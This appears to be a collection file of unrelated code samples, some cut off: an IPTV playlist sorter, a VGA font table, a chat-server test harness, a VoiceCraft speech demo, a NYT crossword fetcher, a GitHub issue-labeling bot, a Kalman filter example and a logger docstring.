\u5c06\u5de5\u4f5c\u7ebf\u7a0b\u8bbe\u7f6e\u4e3a\u5b88\u62a4\u7ebf\u7a0b\n    t.start()\n    #event.set()\n\n# \u6dfb\u52a0\u4e0b\u8f7d\u4efb\u52a1\u5230\u961f\u5217\nfor channel in channels:\n    task_queue.put(channel)\n\n# \u7b49\u5f85\u6240\u6709\u4efb\u52a1\u5b8c\u6210\ntask_queue.join()\n\n\ndef channel_key(channel_name):\n    match = re.search(r'\\d+', channel_name)\n    if match:\n        return int(match.group())\n    else:\n        return float('inf')  # \u8fd4\u56de\u4e00\u4e2a\u65e0\u7a77\u5927\u7684\u6570\u5b57\u4f5c\u4e3a\u5173\u952e\u5b57\n\n# \u5bf9\u9891\u9053\u8fdb\u884c\u6392\u5e8f\nresults.sort(key=lambda x: (x[0], -float(x[2].split()[0])))\n#results.sort(key=lambda x: channel_key(x[0]))\nnow_today = datetime.date.today()\n# \u5c06\u7ed3\u679c\u5199\u5165\u6587\u4ef6\n\nresult_counter = 8  # \u6bcf\u4e2a\u9891\u9053\u9700\u8981\u7684\u4e2a\u6570\n\n# \u6253\u5f00\u6587\u4ef6\uff0c\u51c6\u5907\u5199\u5165\nwith open(\"tv/qita.txt\", 'w', encoding='utf-8') as file:\n    # \u521b\u5efa\u4e00\u4e2a\u5b57\u5178\u6765\u5b58\u50a8\u6bcf\u4e2a\u9891\u9053\u7684\u8ba1\u6570\n    channel_counters = {}\n    # \u5199\u5165\u6587\u4ef6\u7684\u5f00\u5934\u90e8\u5206\n    file.write('\u5176\u4ed6\u9891\u9053,#genre#\\n')\n    # \u904d\u5386\u7ed3\u679c\u5217\u8868\n    for result in results:\n        # \u89e3\u5305\u7ed3\u679c\u5143\u7ec4\n        channel_name, channel_url, speed = result\n        # \u521b\u5efa\u4e00\u4e2a\u5217\u8868\u6765\u5b58\u50a8\u8981\u6392\u9664\u7684\u9891\u9053\u540d\u79f0\n        excluded_channels = ['CCTV', '\u536b\u89c6', '\u6d4b\u8bd5', 'CETV', '\u6559\u80b2', '\u516c\u5171']\n\n        # \u68c0\u67e5\u9891\u9053\u540d\u79f0\u662f\u5426\u4e0d\u5305\u542b\u8981\u6392\u9664\u7684\u9891\u9053\u540d\u79f0\n        if not any(excluded in channel_name for excluded in excluded_channels):\n            # \u83b7\u53d6\u9891\u9053\u7684\u8ba1\u6570\uff0c\u5982\u679c\u9891\u9053\u4e0d\u5728\u5b57\u5178\u4e2d\uff0c\u5c31\u8fd4\u56de 0\n            count = channel_counters.get(channel_name, 0)\n            if count < result_counter:\n                file.write(f\"{channel_name},{channel_url}\\n\")\n                channel_counters[channel_name] = count + 1\n\n\n    from datetime import datetime, timedelta, timezone\n    # \u521b\u5efa\u4e00\u4e2a\u65f6\u533a\u5bf9\u8c61\u8868\u793a\u5317\u4eac\u65f6\u95f4\n    beijing_tz = timezone(timedelta(hours=8))\n    now = datetime.now(beijing_tz)\n    now_today = now.strftime(\"%m\u6708%d\u65e5%H\u65f6\")            \n    file.write(f\"\\n{now_today},#genre#\\n\\nCCTV1,http://58.210.60.226:9901/tsfile/live/0001_1.m3u8?key=txiptv&playlive=1&authid=0\\n\")\n\n",
    "\"\"\"converted from vga_8x16.bin \"\"\"\r\nWIDTH = 8\r\nHEIGHT = 16\r\nFIRST = 0x20\r\nLAST = 0x7f\r\n_FONT =\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x18\\x3c\\x3c\\x3c\\x18\\x18\\x18\\x00\\x18\\x18\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x66\\x66\\x66\\x24\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x6c\\x6c\\xfe\\x6c\\x6c\\x6c\\xfe\\x6c\\x6c\\x00\\x00\\x00\\x00'\\\r\nb'\\x18\\x18\\x7c\\xc6\\xc2\\xc0\\x7c\\x06\\x06\\x86\\xc6\\x7c\\x18\\x18\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\xc2\\xc6\\x0c\\x18\\x30\\x60\\xc6\\x86\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x38\\x6c\\x6c\\x38\\x76\\xdc\\xcc\\xcc\\xcc\\x76\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x30\\x30\\x30\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x0c\\x18\\x30\\x30\\x30\\x30\\x30\\x30\\x18\\x0c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x30\\x18\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x18\\x30\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x66\\x3c\\xff\\x3c\\x66\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x18\\x18\\x7e\\x18\\x18\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x18\\x18\\x30\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x02\\x06\\x0c\\x18\\x30\\x60\\xc0\\x80\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x38\\x6c\\xc6\\xc6\\xd6\\xd6\\xc6\\xc6\\x6c\\x38\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x18\\x38\\x78\\x18\\x18\\x18\\x18\\x18\\x18\\x7e\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\x06\\x0c\\x18\\x30\\x60\\xc0\\xc6\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\x06\\x06\\x3c\\x06\\x06\\x06\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x0c\\x1c\\x3c\\x6c\\xcc\\xfe\\x0c\\x0c\\x0c\\x1e\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\xc0\\xc0\\xc0\\xfc\\x06\\x06\\x06\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x38\\x60\\xc0\\xc0\\xfc\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\xc6\\x06\\x06\\x0c\\x18\\x30\\x30\\x30\\x30\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\x7c\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\x7e\\x06\\x06\\x06\\x0c\\x78\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x18\\x18\\x30\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x06\\x0c\\x18\\x30\\x60\\x30\\x18\\x0c\\x06\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x7e\\x00\\x00\\x7e\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x60\\x30\\x18\\x0c\\x06\\x0c\\x18\\x30\\x60\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\x0c\\x18\\x18\\x18\\x00\\x18\\x18\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x7c\\xc6\\xc6\\xde\\xde\\xde\\xdc\\xc0\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x10\\x38\\x6c\\xc6\\xc6\\xfe\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfc\\x66\\x66\\x66\\x7c\\x66\\x66\\x66\\x66\\xfc\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x66\\xc2\\xc0\\xc0\\xc0\\xc0\\xc2\\x66\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xf8\\x6c\\x66\\x66\\x66\\x66\\x66\\x66\\x6c\\xf8\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\x66\\x62\\x68\\x78\\x68\\x60\\x62\\x66\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\x66\\x62\\x68\\x78\\x68\\x60\\x60\\x60\\xf0\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x66\\xc2\\xc0\\xc0\\xde\\xc6\\xc6\\x66\\x3a\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xfe\\xc6\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x18\\x18\\x18\\x18\\x18\\x18\\x18\\x18\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x1e\\x0c\\x0c\\x0c\\x0c\\x0c\\xcc\\xcc\\xcc\\x78\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xe6\\x66\\x66\\x6c\\x78\\x78\\x6c\\x66\\x66\\xe6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xf0\\x60\\x60\\x60\\x60\\x60\\x60\\x62\\x66\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xee\\xfe\\xfe\\xd6\\xc6\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xe6\\xf6\\xfe\\xde\\xce\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfc\\x66\\x66\\x66\\x7c\\x60\\x60\\x60\\x60\\xf0\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xd6\\xde\\x7c\\x0c\\x0e\\x00\\x00'\\\r\nb'\\x00\\x00\\xfc\\x66\\x66\\x66\\x7c\\x6c\\x66\\x66\\x66\\xe6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\x60\\x38\\x0c\\x06\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7e\\x7e\\x5a\\x18\\x18\\x18\\x18\\x18\\x18\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\x6c\\x38\\x10\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xd6\\xd6\\xd6\\xfe\\xee\\x6c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\x6c\\x7c\\x38\\x38\\x7c\\x6c\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x66\\x66\\x66\\x66\\x3c\\x18\\x18\\x18\\x18\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\xc6\\x86\\x0c\\x18\\x30\\x60\\xc2\\xc6\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x80\\xc0\\xe0\\x70\\x38\\x1c\\x0e\\x06\\x02\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x10\\x38\\x6c\\xc6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x00\\x00'\\\r\nb'\\x00\\x30\\x18\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x78\\x0c\\x7c\\xcc\\xcc\\xcc\\x76\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xe0\\x60\\x60\\x78\\x6c\\x66\\x66\\x66\\x66\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x7c\\xc6\\xc0\\xc0\\xc0\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x1c\\x0c\\x0c\\x3c\\x6c\\xcc\\xcc\\xcc\\xcc\\x76\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x7c\\xc6\\xfe\\xc0\\xc0\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\",
    "import pexpect\nimport os\nimport argparse\nimport json\nimport random\nimport string\nfrom pexpect.exceptions import TIMEOUT as TimeoutException, EOF as EndOfFileException\nimport time\n\nCLIENT_FOLDER_PATH = './'\nADDRESS = \"127.0.0.1\"\nPORT = 5378\nSTUDENT_FILE_PATH = \"../student/server_check/server.py\"\n\ndef generate_name():\n    return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(8, 16)))\n\ndef generate_message(min_len=32, max_len=64):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(min_len, max_len)))\n\nclass TestException(Exception):\n    pass\n\ndef get_last_printed_line(output_buffer):\n    last_printed_line = '[EMPTY LINE. PROGRAM DID NOT PRODUCE ANY OUTPUT] - the client did not produce any output which means it could not connect to the server. Please check you are starting your server at a correct address \\'127.0.0.1\\' and port 5378 and that your server uses reuse option BEFORE binding to the port'\n    lines = output_buffer.split('\\n')\n\n    for line in reversed(lines):\n        if line.strip():\n            last_printed_line = line\n            break\n\n    return last_printed_line\n\ndef handle_pexpect(child_process, processes_to_terminate, expect_string, output_buffer, step, timeout=1, display_expect_string=''):\n    try:\n        child_process.expect(expect_string, timeout=timeout)\n        output_buffer += child_process.before + child_process.after\n\n    except TimeoutException:\n        output_buffer += child_process.before\n        last_printed_line = get_last_printed_line(output_buffer)\n\n        for process in processes_to_terminate:\n            process.terminate(force=True)\n\n        if display_expect_string:\n            expect_string = display_expect_string\n\n        raise TestException(f'unexpected output at step {step}!\\nExpected output to appear within a program:\\n\\n{expect_string}\\n\\nProgram\\'s last printed line: \\n\\n{last_printed_line}\\n\\nTotal program output:\\n\\n{output_buffer}')\n    except EndOfFileException:\n        if type(child_process.before) == 'str':\n            output_buffer += child_process.before\n        \n        if type(child_process.after) == 'str':\n            output_buffer += child_process.after\n        \n        last_printed_line = get_last_printed_line(output_buffer)\n\n        for process in processes_to_terminate:\n            process.terminate(force=True)\n            \n        raise TestException(f'program has unexpectidly terminated at step {step}!\\nExpected output to appear within a program:\\n\\n{expect_string}\\n\\nProgram\\'s last printed line: \\n\\n{last_printed_line}\\n\\nTotal program output:\\n\\n{output_buffer}')\n    \n    return output_buffer\n\ndef start_server():\n    server_process = execute_and_detach(f'python3 {STUDENT_FILE_PATH} --address \"{ADDRESS}\" --port {PORT}')\n    expected_output = \"Server is on\"\n\n    output_buffer = handle_pexpect(server_process, [server_process], expected_output, \"\", \"starting a server\", timeout=10)\n        \n    return server_process, output_buffer\n\n\ndef execute_and_wait(cmd):\n    process = pexpect.spawn('/bin/sh', ['-c', cmd], encoding='utf-8')\n    process.expect(pexpect.EOF)\n    output = process.before  # Capture the output\n    process.wait()\n\n    return process.exitstatus, output\n\ndef execute_and_collect_output(cmd):\n    child = pexpect.spawn(cmd, encoding='utf-8')\n    while True:\n        try:\n            line = child.readline()\n            if not line:\n                break\n            yield line\n        except pexpect.EOF:\n            break\n\ndef execute_and_detach(cmd):\n    child = pexpect.spawn(cmd, encoding='utf-8')\n    return child\n    \n\ndef start_script():\n    expected_output = 'Welcome to Chat Client. Enter your login:'\n\n    current_dir = os.getcwd()\n    os.chdir(CLIENT_FOLDER_PATH)\n\n    client_process = pexpect.spawn(f'java -jar ChatClient.jar', encoding='utf-8')\n\n    os.chdir(current_dir)\n\n    output_buffer = handle_pexpect(client_process, [client_process], expected_output, \"\", \"starting a client\")\n\n    return client_process, output_buffer\n\ndef log_in(client_name=\"client\"):\n    expected_output = f'Successfully logged in as {client_name}!'\n\n    client_process, output_buffer = start_script()\n    client_process.sendline(client_name)\n\n    output_buffer = handle_pexpect(client_process, [client_process], expected_output, output_buffer, \"logging in with a client\", timeout=3)\n\n    return client_process, output_buffer\n\ndef reject_usernames_commas():\n    client_name_pt1 = generate_name()\n    client_name_pt2 = generate_name()\n    \n    expected_output = \"BAD-RQST-BODY\"\n\n    echo_cmd = f'echo \"HELLO-FROM {client_name_pt1},{client_name_pt2}\"'\n    _, echo_output = execute_and_wait(echo_cmd)\n\n    nc_cmd = f'echo \"{echo_output}\" | nc 127.0.0.1 5378 -W 1'\n\n    _, output = execute_and_wait(nc_cmd)\n    \n    if not expected_output in output:\n        raise TestException(f\"your server did not return BAD-RQST-BODY when logging in with a username that contains commas. Reply was '{output}'\")\n\n    return output\n\ndef reject_u",
    "import os\nfrom phonemizer.backend.espeak.wrapper import EspeakWrapper\n\n# import libs\nimport torch\nimport torchaudio\nimport gradio as gr\nimport os\n\nfrom pydub import AudioSegment\nfrom models import voicecraft\nfrom faster_whisper import WhisperModel\n\n# configure environment variables for CUDA support\nos.environ[\"CUDA_DEVICE_ORDER\"]=\"PCI_BUS_ID\"   \nos.environ[\"CUDA_VISIBLE_DEVICES\"]=\"0\" \nos.environ[\"USER\"] = \"root\"\n\nencodec_fn = \"./encodec_4cb2048_giga.th\"\ndevice = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n\n# Load transcriber model to CPU so we don't take up VRAM\nwhisper_model = WhisperModel(\"large-v3\", device=\"cpu\", compute_type=\"int8\")\n\ncurrent_model = None\nmodel = None\nckpt = None\n\n#load tokenizers\nfrom data.tokenizer import (\n    AudioTokenizer,\n    TextTokenizer,\n)\ntext_tokenizer = TextTokenizer(backend=\"espeak\")\naudio_tokenizer = AudioTokenizer(signature=encodec_fn) # will also put the neural codec model on gpu\n\n\nfrom inference_tts_scale import inference_one_sample\n\ndef tts(original_audio, original_transcript,  target_transcript, autotranscribe=False, top_k=0, top_p=0.8, temperature=1, stop_repetition=3,inverse_offset=0, model_weight=\"830M\"):\n    global current_model\n    global model\n    global ckpt\n\n    # Load model based on config passed in; reload if changed\n    if current_model == None or current_model != f\"./giga\"+model_weight+\".pth\":\n        ckpt_fn =f\"./giga\"+model_weight+\".pth\"\n        ckpt = torch.load(ckpt_fn, map_location=\"cpu\")\n\n        model = voicecraft.VoiceCraft(ckpt[\"config\"])\n        model.load_state_dict(ckpt[\"model\"])\n        model.to(device)\n        model.eval()\n        current_model=ckpt_fn\n        print (\"Loaded and using: \"+current_model)\n\n\n    decode_config = {\n        'top_k': top_k,\n        'top_p': top_p,\n        'temperature': temperature,\n        'stop_repetition': stop_repetition, # if there are long silence in the generated audio, reduce the stop_repetition to 3, 2 or even 1\n        'kvcache': 1,\n        \"codec_audio_sr\": 16000,\n        \"codec_sr\": 50,\n        \"silence_tokens\": [1388,1898,131],\n        \"sample_batch_size\": 3 # if there are long silence or unnaturally strecthed words, increase sample_batch_size to 2, 3 or even 4\n    }\n\n    print(original_audio)\n    converted_audio = \"/tmp/input.wav\"\n\n    sound = AudioSegment.from_mp3(original_audio)\n    sound.export(converted_audio, format=\"wav\")\n\n    # if Autotranscribe is set, use whisper to create the input transcription instead of using the provided value\n    if autotranscribe:\n        segments, info = whisper_model.transcribe(converted_audio, initial_prompt=\"here we go umm, uhm, yeaah. Okay, ehm, uuuh.\", beam_size=5)\n        full_text = \"\"\n\n        for segment in segments:\n            full_text += segment.text\n\n        global original_transcript_input \n        original_transcript = full_text\n        print(full_text)\n\n    target_transcript = original_transcript + target_transcript\n    info = torchaudio.info(converted_audio)\n    cut_off_sec = info.num_frames / info.sample_rate\n    audio_dur = info.num_frames / info.sample_rate\n    assert cut_off_sec <= audio_dur, f\"cut_off_sec {cut_off_sec} is larger than the audio duration {audio_dur}\"\n    prompt_end_frame = int(cut_off_sec * info.sample_rate) - int(inverse_offset)\n    print(f\"prompt_end_frame:\",prompt_end_frame)\n    _, gen_audio = inference_one_sample(model, ckpt[\"config\"], ckpt['phn2num'], text_tokenizer, audio_tokenizer, converted_audio, target_transcript, device, decode_config, prompt_end_frame)\n    gen_audio = gen_audio[0].cpu()\n    torchaudio.save(f\"gen.wav\", gen_audio, 16000)\n    return \"gen.wav\", original_transcript\n\n\nwith gr.Blocks() as demo:\n    gr.Markdown(\"# Dockerized Voicecraft: Zero-Shot Speech Editing and Text-to-Speech in the Wild\")\n    with gr.Row():\n        input_audio = gr.Audio(label=\"Original Audio\", type=\"filepath\")\n        autotranscribe_input = gr.Checkbox(value=True,label=\"Autotranscribe input\")\n\n    original_transcript_input = gr.Textbox(label=\"Uploaded Audio Transcript\")\n    new_transcript_input = gr.Textbox(label=\"What would you like to say?\")\n\n    with gr.Row():\n        with gr.Accordion(\"Advanced configuration\", open=False):\n            top_k_input = gr.Number(label=\"Top K\", value=0, precision=0)\n            top_p_input = gr.Slider(label=\"Top P\", value=0.8, minimum=0.1, maximum=1.0, step=0.05)\n            temperature_input = gr.Number(label=\"Temperature\", value=1)\n            stop_word_count_input = gr.Number(label=\"Stop Word Count\", value=3)\n            inverse_offset_input = gr.Number(label=\"Inverse Offset\", value=0)\n            model_input = gr.Radio(label=\"Select Option\", choices=[\"330M\", \"830M\"], value=\"830M\")\n    btn = gr.Button(\"Run\")\n\n    with gr.Row():\n        output_audio = gr.Audio(label=\"Generated Audio\", type=\"filepath\", autoplay=True)\n    btn.click(fn=tts, inputs=[input_audio, original_transcript_input, new_transcript_input, autotranscribe_input, top_k_input, top_p_input, temperature_input, stop_word_count_input, inverse",
    "# nyt.py\n# get puzzle\nimport requests, datetime, re, json\n\nUA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"\n\ndef get(cookie0, cookie1):\n    referer = 'https://www.nytimes.com/crosswords/archive/daily'\n    today = datetime.datetime.now().strftime('%m%d%y')\n    headers = {\"cookie\":cookie0, \"User-Agent\":UA, \"Referer\":referer}\n    url = \"https://www.nytimes.com/crosswords\"\n    d = requests.get(url, headers=headers)\n    puzzle_id = re.search(r\"\\\"daily_puzzle\\\"\\:\\[\\{\\\"puzzle_id\\\"\\:(.*?)\\,\", str(d.content)).groups()[0]\n    url = 'https://www.nytimes.com/svc/crosswords/v2/puzzle/'+str(puzzle_id)+'.pdf'\n    headers.update( {\"cookie\":cookie1, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'no-cache' })\n    d = requests.get(url, headers=headers)\n    if(len(d.content)>1000):\n        f = open('puzzle-%s.pdf' % (today), 'wb')\n        f.write(d.content)\n        f.close()\n        return \"puzzle-%s.pdf\" % (today)\n    else:\n        print(\"problem saving crossword\")\n    return None",
    "from github import GithubException,Repository\n\nfrom bots import bot\nfrom bots.utils import ai_robot\n\n\nclass AILabelBot(bot.GitAutomatorBot):\n    def __handle_pr(self):\n        labels = self.repo_client.get_labels()\n        label_dict = [{'name': label.name, 'color': label.color, 'description': label.description } for label in labels]\n        pull_request = self.repo_client.get_pull(self.webhook_body['pull_request']['number'])\n        context = f\"('pull_request': '{pull_request.title}', 'pull_request_body': '{pull_request.body}')\"\n        gpt = ai_robot.AIAssistant()\n        labels = gpt.get_label(context, label_dict)\n        if len(labels) <= 0:\n            return\n\n        for label in labels:\n            if any(i not in label.keys() for i in ['name', 'color', 'description']):\n                continue\n            type_label = None\n            try:\n                type_label = self.repo_client.get_label(label['name'])\n            except GithubException as err:\n                if err.status != 404:\n                    continue\n                type_label = self.repo_client.create_label(label['name'], label['color'], label['description'])\n            for exist_label in pull_request.get_labels():\n                if exist_label.name == label['name']:\n                    continue\n            pull_request.add_to_labels(type_label)\n\n    def __handle_issue(self):\n        labels = self.repo_client.get_labels()\n        label_dict = [{'name': label.name, 'color': label.color, 'description': label.description } for label in labels]\n        issue = self.repo_client.get_issue(self.webhook_body['issue']['number'])\n        context = f\"('issue_title': '{issue.title}', 'issue_body': '{issue.body}')\"\n        gpt = ai_robot.AIAssistant()\n        labels = gpt.get_label(context, label_dict)\n        if len(labels) <= 0:\n            return\n\n        for label in labels:\n            if any(i not in label.keys() for i in ['name', 'color', 'description']):\n                continue\n            type_label = None\n            try:\n                type_label = self.repo_client.get_label(label['name'])\n            except GithubException as err:\n                if err.status != 404:\n                    continue\n                type_label = self.repo_client.create_label(label['name'], label['color'], label['description'])\n            for exist_label in issue.get_labels():\n                if exist_label.name == label['name']:\n                    continue\n            issue.add_to_labels(type_label)\n\n    def handle_action(self, event_type: str):\n        if event_type == 'issue':\n            self.__handle_issue()\n        if event_type == 'pull_request':\n            self.__handle_pr()\n\n    @property\n    def name(self) -> str:\n        return 'ailabel'\n\ndef new_gitautomator_bot(repo_client: Repository.Repository, json_body: dict, token: str) -> bot.GitAutomatorBot:\n    return AILabelBot(repo_client, json_body, token)\n",
    "from typing import List\nimport numpy as np\nfrom navlie.lib.datasets import SimulatedInertialGPSDataset\nimport navlie as nav\n\n\ndef main():\n    np.set_printoptions(precision=3, suppress=True, linewidth=200)\n    np.random.seed(0)\n\n    # ##########################################################################\n    # Load pre-developed dataset\n    data = SimulatedInertialGPSDataset(t_start=0, t_end=20)\n    gt_states = data.get_ground_truth()\n    input_data = data.get_input_data()\n    meas_data = data.get_measurement_data()\n\n    # Filter initialization\n    P0 = np.eye(15)\n    P0[0:3, 0:3] *= 0.1**2\n    P0[3:6, 3:6] *= 0.1**2\n    P0[6:9, 6:9] *= 0.1**2\n    P0[9:12, 9:12] *= 0.01**2\n    P0[12:15, 12:15] *= 0.01**2\n    x0 = gt_states[0].plus(nav.randvec(P0))\n\n    # ###########################################################################\n    # Run filter\n    ekf = nav.ExtendedKalmanFilter(data.process_model)\n    estimate_list = nav.run_filter(ekf, x0, P0, input_data, meas_data)\n\n    # Postprocess the results and plot\n    results = nav.GaussianResultList.from_estimates(estimate_list, gt_states)\n    return results\n\n\nif __name__ == \"__main__\":\n    results = main()\n\n    # ##########################################################################\n    # Plot results\n    import matplotlib.pyplot as plt\n\n    fig = plt.figure()\n    ax = plt.axes(projection=\"3d\")\n    nav.plot_poses(\n        results.state, ax, line_color=\"tab:blue\", step=20, label=\"Estimate\"\n    )\n    nav.plot_poses(\n        results.state_true,\n        ax,\n        line_color=\"tab:red\",\n        step=500,\n        label=\"Groundtruth\",\n    )\n    ax.legend()\n\n    fig, axs = nav.plot_error(results)\n    axs[0, 0].set_title(\"Attitude\")\n    axs[0, 1].set_title(\"Velocity\")\n    axs[0, 2].set_title(\"Position\")\n    axs[0, 3].set_title(\"Gyro bias\")\n    axs[0, 4].set_title(\"Accel bias\")\n    axs[-1, 2]\n\n    plt.show()\n",
    "r\"\"\"\n:class:`Logger` \u662f\u8bb0\u5f55\u65e5\u5fd7\u7684\u6a21\u5757\uff0c**logger** \u5c01\u88c5\u4e86 logging \u6a21\u5757\u7684 Logger\uff0c\n\u5177\u4f53\u4f7f\u7528\u65b9\u5f0f\u4e0e\u76f4\u63a5\u4f7f\u7528 :class:`logging.Logger` \u76f8\u540c\uff0c\u540c\u65f6\u4e5f\u65b0\u589e\u4e00\u4e9b\u7b80\u5355\u597d\u7528\u7684API\n\n\u4f7f\u7528\u65b9\u5f0f::\n\n    # logger \u53ef\u4ee5\u548c logging.Logger \u4e00\u6837\u4f7f\u7528\n    logger.info('your msg')\n    logger.error('your msg')\n\n    # logger \u65b0\u589e\u7684API\n    # \u5c06\u65e5\u5fd7\u8f93\u51fa\u5230\u6587\u4ef6\uff0c\u4ee5\u53ca\u8f93\u51fa\u7684\u65e5\u5fd7\u7b49\u7ea7\n    logger.add_file('/path/to/log', level='INFO')\n    # \u5b9a\u4e49\u5728\u547d\u4ee4\u884c\u4e2d\u7684\u663e\u793a\u683c\u5f0f\u548c\u65e5\u5fd7\u7b49\u7ea7\n    logger.set_stdout('tqdm', level='WARN')\n    # \u4ec5\u8b66\u544a\u4e00\u6b21\n    logger.warning_once('your msg')\n    # 